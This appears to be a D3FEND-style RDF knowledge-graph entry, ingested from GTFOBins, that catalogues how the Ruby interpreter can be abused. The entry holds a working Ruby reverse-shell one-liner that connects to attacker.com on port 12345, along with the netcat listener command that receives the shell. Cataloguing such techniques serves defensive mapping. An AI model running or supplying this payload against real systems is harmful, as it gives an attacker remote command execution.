mknd:command_ruby-reverse-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "ruby-reverse-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Run `nc -l -p 12345` on the attacker box to receive the shell." ;
    d3f:uses mknd:executable_ruby ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_ruby ;
    mknd:provides mknd:function_reverse-shell ;
    mknd:value """export RHOST=attacker.com
export RPORT=12345
ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
""" .

